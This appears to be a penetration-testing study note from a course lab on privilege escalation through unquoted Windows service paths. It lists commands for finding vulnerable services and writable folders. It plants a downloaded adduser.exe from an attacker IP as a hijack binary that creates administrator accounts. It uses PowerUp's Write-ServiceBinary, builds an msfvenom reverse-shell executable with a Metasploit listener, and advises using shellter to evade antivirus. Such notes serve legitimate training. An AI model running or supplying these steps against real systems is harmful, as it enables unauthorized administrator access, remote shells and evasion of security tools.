# Unquoted Service Path

## **PWK2024**

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

The below command works only from **cmd**

{% code title="List of services with spaces and missing quotes in the binary path" overflow="wrap" %}
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
{% endcode %}

{% code title="Using Start-Service and Stop-Service to check if user steve has permissions to start and stop GammaService" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```
{% endcode %}

{% code title="How Windows tries to locate the correct path of the unquoted service GammaService" overflow="wrap" %}
```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```
{% endcode %}

{% code title="Reviewing permissions on the Enterprise Apps directory" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W)
                                 CREATOR OWNER:(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```
{% endcode %}

{% code title="Download adduser.exe, save it as Current.exe, and copy it to Enterprise Apps directory" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve> iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe

PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```
{% endcode %}

{% code title="Start service GammaService and confirm that dave2 was created as member of local Administrators group" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve> Start-Service GammaService
Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start
service GammaService on computer '.'.
At line:1 char:1
+ Start-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
    
PS C:\Users\steve> net user

Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
...
Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```
{% endcode %}

### **PowerUp.ps1**

{% code title=" Using Get-UnquotedService to list potential vulnerable services" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\dave> iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

PS C:\Users\dave> powershell -ep bypass
...

PS C:\Users\dave> . .\PowerUp.ps1

PS C:\Users\dave> Get-UnquotedService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
```
{% endcode %}

{% code title="Using the AbuseFunction to exploit the unquoted service path of GammaService" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

ServiceName  Path                                         Command
-----------  ----                                         -------
GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net loc...

PS C:\Users\steve> Restart-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...
Restart-Service : Failed to start service 'GammaService (GammaService)'.
At line:1 char:1
+ Restart-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
   , ServiceCommandException
    + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand

PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    john            offsec
steve                    WDAGUtilityAccount

The command completed successfully.

PS C:\Users\steve> net localgroup administrators
...
john
...

```
{% endcode %}

## **Finding Unquoted Service Path Vulnerabilities**

Tools like winPEAS and PowerUp.ps1 will usually detect unquoted service paths. But we will need to make sure other requirements to exploit the vulnerability are filled. These are;

1. Being able to write to a folder on the path (icacls)
2. Being able to restart the service

If either of these conditions is not met, successful exploitation may not be possible. \


The command below will list services running on the target system. The result will also print out other information, such as the display name and path.&#x20;

`wmic service get name,displayname,pathname,startmode`

You can further check the binary path of this service using the command below:&#x20;

`sc qc unquotedsvc`

Once we have confirmed that the binary path is unquoted, we will need to check our privileges on folders in the path. Our goal is to find a folder that is writable by our current user. We can use accesschk.exe with the command below to check for our privileges.

`.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"`

The output will list user groups with read (R) and write (W) privileges on the "Program Files" folder.



We now have found a folder we can write to. As this folder is also in the service's binary path, we know the service will try to run an executable with the name of the first word of the folder name.&#x20;



`msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI or AttackBox IP Address] LPORT=[The Port to which the reverse shell will connect] -f exe > executable_name.exe`

```shell-session
msf6 > use exploit/multi/handler 
[*] Using configured payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set lport 8899
lport => 8899
msf6 exploit(multi/handler) > set lhost 10.9.6.195
lhost => 10.9.6.195
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.6.195:8899
```

{% hint style="info" %}
use shellter to evade AV. Ensure that shellter is installed with Wine on Kali. The instructions can be found in the AV Evasion module if needed
{% endhint %}
